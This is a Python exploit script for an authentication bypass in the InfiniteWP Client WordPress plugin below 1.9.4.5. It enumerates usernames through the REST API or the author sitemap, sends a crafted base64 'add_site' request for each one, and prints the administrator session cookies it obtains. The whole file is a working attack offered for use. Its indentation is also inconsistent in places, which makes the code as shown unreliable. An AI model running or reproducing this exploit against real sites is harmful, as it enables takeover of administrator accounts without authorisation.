#
# InfiniteWP Client < 1.9.4.5 - Authentication Bypass
#
# Exploit Script By @random_robbie
# 
# Requires Wordpress API Users Exposed!
#
# Based off https://0day.work/infinitewp-client-1-9-4-5-authentication-bypass/
#
import requests
import json
import sys
import base64
import argparse
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Wordpress URL")
parser.add_argument("-m", "--method", required=True, help="Please Use -m rest for rest api or -m sitemap for yoast seo authors site map")
args = parser.parse_args()
url = args.url
method = args.method



proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}




def test_user(url,user):
	print(("[*] Testing User "+user+" [*]"))
	json_info = {"iwp_action":"add_site","params":{"username": user}}
	data="_IWP_JSON_PREFIX_{}".format(base64.b64encode(json.dumps(json_info).encode("utf-8")).decode("utf-8"))
	headers2 = {"User-Agent":"curl/7.67.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	response2 = session.post(url, data=data, headers=headers2,verify=False, proxies=proxies)
	if 'wordpress_logged_in' in str(response2.headers):
		print(("[*]Found Admin User: "+user+"[*]")) 
		cookie_string = "; ".join([str(x)+"="+str(y) for x,y in list(response2.cookies.items())])
		if cookie_string:
			print(("[+] Use Cookies to Login: \n{}".format(cookie_string)))
        else:
            print('[-] "wordpress_logged_in" session token not present. Exploit apparently failed.')
	
	
	




def grab_users_api(url):
	headers = {"User-Agent":"curl/7.54.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/wp-json/wp/v2/users", headers=headers,verify=False, proxies=proxies)
	if 'rest_user_cannot_view' in response.text:
		print ("[-] API Endpoint Requires Permissions\n")
		sys.exit()
	if response.status_code == 404:
		print ("[-] API Endpoint returns 404 Not Found\n")
		sys.exit()
        elif response.status_code == 200:
		print("[*]Users Found[*]")
		jsonstr = json.loads(response.content)
		for id in jsonstr:
			userid = str(id['id'])
			userint = id['id']
			user = id['slug']
			print(("Found User: "+user+" with ID: "+userid+""))
			test_user(url,user)
        else:
            print('[-] REST  enum failed. Got respose code: {}'.format(response.status_code))

def grab_users_sitemap(url):
	headers = {"User-Agent":"curl/7.54.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/author-sitemap.xml", headers=headers,verify=False, proxies=proxies)
	if response.status_code == 404:
		print("No Author SiteMap Found - 404")
        elif response.status_code == 200:
		print("[*]Users Found[*]")
		auth = re.findall(r'(<loc>(.*?)</loc>)\s',response.content)
		for user in auth:
			thisuser = user[1]
			h = thisuser.split('/')
			realuser = h[4]
			test_user(url,realuser)
        else:
            print('[-] Sitemap enum failed. Got response code: {}'.format(response.status_code))
		
if method == "rest":
	grab_users_api(url)
elif method == "sitemap":
	grab_users_sitemap(url)
else:
	print ("Please Choose Method of rest or sitemap")
